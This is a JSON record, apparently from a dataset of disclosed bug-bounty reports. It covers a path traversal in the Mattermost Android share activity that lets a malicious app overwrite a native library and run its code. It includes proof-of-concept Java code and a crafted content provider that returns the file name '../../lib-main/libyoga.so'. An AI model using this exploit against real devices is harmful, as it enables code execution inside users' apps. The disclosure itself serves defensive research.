{
  "reported_to": "Mattermost",
  "reported_by": "hulkvision_ ",
  "title": "Persistant Arbitrary code execution in mattermost android",
  "content": "\nSummary:\nActivity com.mattermost.share.ShareActivity is is exported and is designed to allow file sharing from third party application to mattermost android app.\nCode 658 Bytes\n1 <activity android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:name=\"com.mattermost.share.ShareActivity\" android:taskAffinity=\"com.mattermost.share\" android:launchMode=\"singleInstance\" android:screenOrientation=\"portrait\" android:configChanges=\"keyboard|keyboardHidden|orientation|screenSize\">\n2            <intent-filter>\n3                <action android:name=\"android.intent.action.SEND\"/>\n4                <action android:name=\"android.intent.action.SEND_MULTIPLE\"/>\n5                <category android:name=\"android.intent.category.DEFAULT\"/>\n6                <data android:mimeType=\"*/*\"/>\n7            </intent-filter>\n8        </activity>\nI have found path tansversal vulnerability at com.mattermost.share.RealPathUtil.java file\nCode 743 Bytes\n1public static String getPathFromSavingTempFile(Context context, final Uri uri) {\n2             int nameIndex = returnCursor.getColumnIndex(OpenableColumns.DISPLAY_NAME); //get file name here \n3            returnCursor.moveToFirst();\n4            fileName = returnCursor.getString(nameIndex); // \"filename=../../lib-main/libyoga.so\"\n5        } catch (Exception e) {\n6            // just continue to get the filename with the last segment of the path\n7       }\n8             String mimeType = getMimeType(uri.getPath());\n9            tmpFile = new File(cacheDir, fileName);\n10            tmpFile.createNewFile();  //path transversal here\n11            ParcelFileDescriptor pfd = context.getContentResolver().openFileDescriptor(uri, \"r\"); \n12            //.../\nIt receives the value of _display_name from the provider and saved the file with this name, leading to path-traversal.\n## Steps To Reproduce:\nInstall the POC app and open it. app-release.apk (F1216351)\nOn the next launch of the app the malicious code will be executed.In this poc the app will crash on next launch because i was too lazy and to create a modified version of libyoga.so\nPOC\nIn MainActivity.java\nCode 410 Bytes\n1        Intent intent = new Intent(Intent.ACTION_SEND);\n2        intent.setClassName(\"com.mattermost.rn\", \"com.mattermost.share.ShareActivity\");\n3        intent.putExtra(\"android.intent.extra.STREAM\",Uri.parse(\"content://com.example.android.pocok/?path=/data/data/com.example.android.pocok/libevil-lib.so&name=../../lib-main/libyoga.so\"));\n4        intent.setType(\"application/*\");\n5        startActivity(intent);\n6\nIn EvilContentProvider.java\nCode 498 Bytes\n1public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {\n2    MatrixCursor matrixCursor = new MatrixCursor(new String[]{\"_display_name\"});\n3    matrixCursor.addRow(new Object[]{uri.getQueryParameter(\"name\")});\n4    return matrixCursor;\n5}\n6\n7public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {\n8    return ParcelFileDescriptor.open(new File(uri.getQueryParameter(\"path\")), ParcelFileDescriptor.MODE_READ_ONLY);\n9}\nIn AndroidManifest.xml\nCode 143 Bytes\n1<provider android:name=\".EvilContentProvider\" android:authorities=\"com.example.android.pocok\" android:enabled=\"true\" android:exported=\"true\" />\nImpact\nAttacker can inject malicious library file in the application which will lead to arbitrary code execution in the app.\n\n",
  "severity": [
    7.8,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1622731200,
  "report_url": "https://hackerone.com/reports/1115864",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "MOBILE",
  "steps": [
    [
      1,
      "Install the POC app (app-release.apk) and open it."
    ],
    [
      2,
      "Launch the app again to trigger the execution of the malicious code."
    ]
  ],
  "vuln_description": "The vulnerability involves a path traversal issue in the Mattermost Android app, where the ShareActivity component improperly handles file names from a content provider, allowing an attacker to overwrite critical library files with malicious ones, leading to arbitrary code execution.",
  "reason": "The attack requires understanding and manipulating multiple components: the ShareActivity's exported status, the content provider's handling of file names, and the path traversal in file creation. The interaction between these components is non-obvious, and the attacker must craft a malicious content provider to exploit the vulnerability.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves a path traversal and arbitrary code execution via an exported activity in the Mattermost Android app. The methodology described focuses on authentication and authorization bugs (IDOR, AuthN/AuthZ bypass) within the same application context by swapping user sessions and resource IDs. However, this vulnerability is a client-side issue involving file handling and does not fit the described methodology, which is primarily for server-side or API-level authN/authZ issues.",
    "is_detectable": false
  }
}